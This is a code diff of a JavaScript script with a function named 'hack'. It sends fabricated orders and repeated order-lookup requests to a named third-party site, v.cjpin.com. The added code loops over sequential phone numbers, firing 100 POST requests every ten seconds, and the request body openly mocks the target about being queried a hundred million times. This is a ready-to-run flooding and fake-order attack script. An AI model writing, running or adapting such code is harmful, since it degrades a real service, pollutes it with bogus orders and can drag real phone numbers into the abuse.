@@ -3,7 +3,19 @@ const GBK = require('./gbk');
 
 const encode = (s) => GBK.URI.encodeURI(s);
 
-// const times = 1;
+const check = async (tel) => {
+  const url = 'https://v.cjpin.com/app/checkorder/index.asp';
+  try {
+    const res = await fetch(url, {
+      method: 'POST',
+      body: { tel: '反正结果都一样, 我查询一亿次也没事对吧' },
+    });
+
+    console.log(res);
+  } catch (error) {
+    console.log(error);
+  }
+};
 
 const hack = () => {
   const currentDate = new Date();
@@ -34,15 +46,11 @@ const hack = () => {
     ['price', '188'],
     ['pay', 'wxpay'],
     ['guest', ''],
-    [
-      'fromurl',
-      'https%3A%2F%2Fv.cjpin.com%2Forder%2Fpay.asp%3Forder_no%3D2020119223126028%26mob%3D13400000000%26nowurl%3Dhttps%3A%2F%2Fv.cjpin.com%2FK001.htm',
-    ],
-    ['nowurl', 'https%3A%2F%2Fv.cjpin.com%2FK001.htm'],
+    ['fromurl', 'https://v.cjpin.com/'],
+    ['nowurl', 'https://v.cjpin.com/K001.htm'],
     ['keyword', ''],
     ['gzid', ''],
-    ['submit', ''],
-    ['tltime', '46'],
+    ['submit', encode(' 立即提交订单')],
   ]
     .map((line) => `${line[0]}=${encodeURI(line[1])}`)
     .join('&')}`;
@@ -59,11 +67,14 @@ const hack = () => {
     .catch((err) => console.log(err));
 };
 
-hack();
-// setInterval(hack, 5000);
+const loop = (n) => {
+  let x = 1;
+  while (x <= n) {
+    check(13000000000 + x);
+    console.log(13000000000 + x);
+    x += 1;
+  }
+};
 
-// let x = 1;
-// while (1) {
-//   console.log(++x);
-//   hack();
-// }
+loop(100);
+setInterval(() => loop(100), 10000);
